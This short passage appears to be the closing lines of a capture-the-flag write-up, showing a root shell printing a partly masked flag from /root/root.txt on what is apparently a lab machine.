bash-5.2# cat /root/root.txt 
44d**************************5f5
```
